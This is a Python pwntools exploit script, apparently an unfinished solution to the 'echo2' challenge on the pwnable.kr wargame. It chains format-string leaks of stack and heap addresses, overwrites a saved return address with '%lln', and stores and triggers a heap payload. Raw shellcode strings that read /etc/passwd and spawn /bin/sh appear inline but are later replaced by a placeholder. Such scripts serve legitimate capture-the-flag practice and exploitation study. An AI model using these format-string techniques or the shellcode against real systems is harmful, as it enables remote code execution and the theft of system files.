# -*- coding: utf-8 -*-
from pwn import *

host = '0'
host = 'pwnable.kr'
#conn = process('./echo2')
conn = connect(host, 9011)

nombre = 'physics'


# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = '\x90' * 0 + "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
shellcode = '\x90' * 0 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
objo = 0x602098
shellcode = 'A' * 32

assert len(shellcode) <= 32

def main():
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get ret addr on stack frame
	conn.sendline('2')
	conn.recvuntil(nombre)
	conn.sendline('%9$p')
	conn.recvline()
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret_addr = leak - 216
	print 'main ret addr:' + hex(ret_addr)
	print ''
	conn.recvuntil('> ')

	# get shellcode addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload = '%7$s    ' + p64(objo)
	conn.sendline( payload )
	conn.recvline()
	line = conn.recv(4)
	if line[-1] == '\x20':
		line = line[:-1] + '\x00'
	leak = line + '\x00' * 4
	leak = u64(leak)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 0x30 + 4
	if len(hex(shellcode_addr)) > 8:
		print 'try again'
		#conn.close()
		#return
	print 'shellcode addr:' + hex(shellcode_addr)
	print ''
	conn.recvuntil('> ')

	# overwrite ret addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload  = '%7$lln  '
	payload += p64(ret_addr)
	conn.sendline( payload )
	conn.recvuntil('> ')

	sh_bytes = hex(shellcode_addr)[2:]
	b1 = (2, int(sh_bytes[0:2], 16))
	b2 = (1, int(sh_bytes[2:4], 16))
	b3 = (0, int(sh_bytes[4:6], 16))
	sh_bytes = [b1, b2, b3]
	#sh_bytes.sort(key=lambda x: x[1])

	#for sh_byte in sh_bytes:
	#	pos, lenght = sh_byte
	#	if lenght < 8:
	#		print 'try again'
	#		conn.close()
	#		return
	#	else:
	#		conn.sendline('2')
	#		conn.recvuntil(nombre)
	#		print 'escribo:' + hex(lenght)
	#		extra = len(str(lenght))
	#		payload  = '%{:d}x'.format(lenght - (8 - extra))
	#		payload += ' ' * (8 - extra)
	#		payload += '%8$hhn'
	#		payload += p64(ret_addr +  pos)
	#		conn.sendline( payload )
	#		conn.recvuntil('> ')

	# place shellcode on heap
	conn.sendline('3')
	conn.sendline(shellcode)
	conn.recvuntil('> ')

	# debug
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload  = 'a%7$x   '
	payload += p64(shellcode_addr)
	conn.sendline( payload )
	conn.recvline()
	line = conn.recvline()
	print 'linea:' + line
	conn.recvuntil('> ')
	# f\xba\xff\x0fH1�\x05H1\xff@\x80�H\x89�H1�\x0f\x05H1�<
	#1�H\xbbѝ\x96\x91Ќ\x97\xffH��ST_\x99RWT^\xb0;\x0f\x05

	# debug

	# trigger shellcode
	conn.sendline('4')
	conn.sendline('y')
	conn.recvuntil('bye')
	#conn.interactive()
	conn.close()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass
